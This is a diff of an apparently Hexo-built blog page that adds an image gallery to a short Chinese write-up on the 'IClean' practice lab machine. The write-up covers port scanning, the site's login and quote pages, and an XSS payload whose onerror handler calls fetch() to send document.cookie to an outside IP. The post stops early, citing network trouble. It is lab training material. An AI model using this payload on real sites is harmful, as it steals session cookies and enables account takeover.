@@ -73,6 +73,8 @@
     
 	<!-- mathjax -->
 	
+  
+  
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -190,25 +192,30 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="IClean-获取flag"><a href="#IClean-获取flag" class="headerlink" title="IClean 获取flag"></a>IClean 获取flag</h1><h2 id="机器环境"><a href="#机器环境" class="headerlink" title="机器环境"></a>机器环境</h2><h3 id="目标机器"><a href="#目标机器" class="headerlink" title="目标机器"></a>目标机器</h3><p>IP : 10.10.11.12</p>
-<p><img src="/../assets/img/image-62.png" alt="alt text"></p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="IClean-获取flag"><a href="#IClean-获取flag" class="headerlink" title="IClean 获取flag"></a>IClean 获取flag</h1><h2 id="机器环境"><a href="#机器环境" class="headerlink" title="机器环境"></a>机器环境</h2><h3 id="目标机器"><a href="#目标机器" class="headerlink" title="目标机器"></a>目标机器</h3><p>IP : 10.10.11.12</p>
+<p><a href="/../assets/img/image-62.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-62.png" alt="alt text"></a></p>
 <blockquote>
-<p>由于我想要使用windows中的浏览器和burpusuite进行攻击, 但是同时想要使用kali中的工具进行攻击，如何实现呢？<br><img src="/../assets/img/image-64.png" alt="alt text"></p>
+<p>由于我想要使用windows中的浏览器和burpusuite进行攻击, 但是同时想要使用kali中的工具进行攻击，如何实现呢？<br><a href="/../assets/img/image-64.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-64.png" alt="alt text"></a></p>
 </blockquote>
 <h3 id="宿主机器"><a href="#宿主机器" class="headerlink" title="宿主机器"></a>宿主机器</h3><p>IP : </p>
-<p><img src="/../assets/img/image-63.png" alt="alt text"></p>
+<p><a href="/../assets/img/image-63.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-63.png" alt="alt text"></a></p>
 <h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><ol>
-<li><p>给的是IP地址，直接扫描端口<br> <img src="/../assets/img/image-65.png" alt="alt text"><br> 被扫坏了 重新启动</p>
+<li><p>给的是IP地址，直接扫描端口<br> <a href="/../assets/img/image-65.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-65.png" alt="alt text"></a><br> 被扫坏了 重新启动</p>
 </li>
-<li><p>看到80端口，直接访问<br> <img src="/../assets/img/image-66.png" alt="alt text"><br> 登录API<br> <a target="_blank" rel="noopener" href="http://capiclean.htb/login">http://capiclean.htb/login</a><br> <a target="_blank" rel="noopener" href="http://capiclean.htb/quote">http://capiclean.htb/quote</a></p>
-<p> <img src="/../assets/img/image-69.png" alt="alt text"></p>
+<li><p>看到80端口，直接访问<br> <a href="/../assets/img/image-66.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-66.png" alt="alt text"></a><br> 登录API<br> <a target="_blank" rel="noopener" href="http://capiclean.htb/login">http://capiclean.htb/login</a><br> <a target="_blank" rel="noopener" href="http://capiclean.htb/quote">http://capiclean.htb/quote</a></p>
+<p> <a href="/../assets/img/image-69.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-69.png" alt="alt text"></a></p>
 </li>
 </ol>
-<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>  web界面<br>  <img src="/../assets/img/image-70.png" alt="alt text"></p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>  web界面<br>  <a href="/../assets/img/image-70.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-70.png" alt="alt text"></a></p>
 <pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=fetch(<span class="string">&quot;http://192.168.31.241:4321/&quot;</span>+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
 </code></pre>
 <h3 id="cao-遮掉网络不稳啊"><a href="#cao-遮掉网络不稳啊" class="headerlink" title="cao, 遮掉网络不稳啊"></a>cao, 遮掉网络不稳啊</h3><p>玩玩ctf吧， 好像白天稳啊</p>
-
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -384,6 +391,10 @@
           (document.getElementById('utterances_thread')).appendChild(script);
       }());
   </script>
+
+
+
+<!-- FancyBox -->
 
 </body>
 </html>
